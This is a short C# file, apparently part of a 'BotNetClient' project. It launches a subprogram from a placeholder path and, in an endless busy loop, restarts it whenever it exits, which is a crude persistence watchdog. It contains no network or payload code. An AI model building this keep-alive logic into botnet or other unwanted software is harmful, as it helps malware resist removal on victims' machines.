using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace BotNetClient
{
    class SecondThread
    {
        public static void miniprog()
        {
            Process proc = Process.Start("Путь к подпрограмме");
            while (true)
            {
                if (!proc.HasExited)
                {

                }
                else
                {
                    proc.Start();
                }
            }
        }
    }
}
